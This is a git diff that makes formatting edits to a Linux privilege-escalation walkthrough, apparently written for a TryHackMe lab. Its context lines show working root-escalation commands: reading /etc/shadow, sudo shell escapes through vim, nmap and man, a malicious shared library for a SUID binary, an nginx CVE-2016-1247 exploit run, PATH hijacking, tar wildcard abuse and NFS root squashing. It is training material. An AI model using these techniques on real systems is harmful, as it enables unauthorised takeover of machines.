@@ -51,7 +51,7 @@ $cat /etc/shadow #Save this one with a different name in your atack box
 
  And we get the root password.
 
- ## Privilege Escalation - SSH keys
+## Privilege Escalation - SSH keys
 
  We can try to find the id_rsa file in the system if present we can use to login to the system
 
@@ -66,15 +66,15 @@ $cat /etc/shadow #Save this one with a different name in your atack box
  $ssh -i id_rsa root@<ip>
  ```
 
- ## Privilege Escalation - Sudo (Shell Escaping)
+## Privilege Escalation - Sudo (Shell Escaping)
 
  If we run ```sudo -l``` we can see there are bunch of binaries that has sudo with nopasswd permission for the user (the binaries are iftop, find, nano, vim, man, awk, less, ftp, nmap, more)
 
  We will try to escape them one by one.
 
- ### iftop
- 
- From [GTFobins](https://gtfobins.github.io/gtfobins/iftop/#sudo) If the binary is allowed to run as superuser by **sudo**, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. 
+### iftop
+
+From [GTFobins](https://gtfobins.github.io/gtfobins/iftop/#sudo) If the binary is allowed to run as superuser by **sudo**, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
 
 ```bash
 $sudo iftop
@@ -107,7 +107,7 @@ $sudo vim -c ':python3 import os; os.execl("/bin/sh", "sh", "-c", "reset; exec s
 $sudo vim -c ':lua os.execute("reset; exec sh")' #This requires that vim is compiled with lua support
 ```
 
-### man 
+### man
 
 ```bash
 $sudo man man
@@ -152,7 +152,6 @@ $sudo nmap --script=$TF
 or
 $echo "os.execute('bin/bash')" > shell.nse && sudo nmap --script=shell.nse
 ```
-
 
 Second way interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.
 
@@ -199,7 +198,7 @@ Save the file as x.c then execute ```gcc -fPIC -shared -o /tmp/x.so s.c -nostart
 
 In comman prompt type ```find / -type f -perm -04000 -ls 2>/dev/null``` make note of all the suid binaries. In command line type : ```strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"``` From the output, we can see that a .so file is missing from a writable directory.
 
-#### Exploitation
+## Exploitation
 
 In comand prompt type: ```mkdir /home/user/.config``` then ```cd /home/user/.config``` after that ```vi libcalc.c``` add the code below to the file
 
@@ -222,18 +221,21 @@ And we get the root shell.
 
 ```dpkg -l | grep nginx``` shows that nginx version is below 1.6.2-5+deb8u3. After searching cve we found that there is a cve exists for below this version (CVE-2016-1247). So, let us try to exploit it. Let's login as www-data with ```su -l www-data``` in root shell then in command prompt type ```/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log``` At this stage, the system waits for logrotate to execute. One logrotate executes we get the root terminal here.
 
-### For testing 
+### For testing
+
 Let us open another therminal and login as root with the given root pass. As root type ```invoke-rc.d nginx rotate >/dev/null 2>&1```
 
 ## Privilege Escalation - SUID (Environment Variables \#1)
 
-Find the SUID enabled binary as earlier. Then in terminal type 
+Find the SUID enabled binary as earlier. Then in terminal type
+
 ```bash
 $echo 'int main() {setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
 $gcc /tmp/service.c -o /tmp/service
 $export PATH=/tmp:$PATH
 /usr/local/bin/suid-env
 ```
+
 And we get to the root shell.
 
 ## Privilege Escalation - SUID (Environment Variables \#2)
@@ -271,7 +273,7 @@ Wait 1 min for the bash script to execute then type ```/tmp/bash -p``` and you c
 
 ## Privilege Escalation - (Wildcards)
 
-We have seen there is another script file let's see the code of that script ```cat /usr/local/bin/compress.sh```. We can see that wildcard (*) is used by tar. 
+We have seen there is another script file let's see the code of that script ```cat /usr/local/bin/compress.sh```. We can see that wildcard (*) is used by tar.
 
 Exploitation Method
 
@@ -289,7 +291,7 @@ We have seen that there is a script file called overwrite.sh let's try to find i
 
 ## Privilege Escalation - NFS root Squashing
 
-Find the NFS permission by using ```cat /etc/exports```, now find the exports by using ```showmount -e ip```. Now in attacker machine type 
+Find the NFS permission by using ```cat /etc/exports```, now find the exports by using ```showmount -e ip```. Now in attacker machine type
 
 ```bash
 $mkdir /tmp/1
@@ -302,6 +304,7 @@ $mkdir /tmp/1
 In target machine run ```/tmp/x```
 
 ## Resources
+
 [TryHackMe](https://tryhackme.com)
 [LegalHackers](https://legalhackers.com/)
 [GTFobins](https://gtfobins.github.io/)
